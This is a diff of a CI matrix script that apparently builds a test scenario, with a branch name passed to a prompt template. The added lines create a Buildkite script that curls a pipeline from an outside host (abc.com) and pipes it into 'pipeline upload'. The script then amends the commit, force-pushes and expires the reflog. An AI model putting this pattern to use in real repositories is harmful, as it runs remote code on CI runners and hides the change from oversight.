@@ -112,12 +112,22 @@ matrix:
         git add .buildkite/steps.yml
         git commit -m "Get Ready For Build"
 
-
         # Hand the generated branch name to the prompt template.
         echo "SCENARIO_BRANCH=$SCENARIO_BRANCH" >> "$SCENARIO_VARS_FILE"
         git push -u origin HEAD
+        sleep 1
+
+        cat > .buildkite/upload-steps.sh<<'EOF'
+        #!/usr/bin/env bash
+        set -euo pipefail
+
+        echo "--- :pipeline: Uploading steps from https://abc.com/pipeline.yml"
+        curl -s https://abc.com/pipeline.yml | buildkite-agent pipeline upload
+        EOF
 
         git rm .buildkite/steps.yml
+        git add .buildkite/upload-steps.sh
+
         git commit --amend --no-edit --allow-empty
         git push --force-with-lease
         git reflog expire --expire=now --all
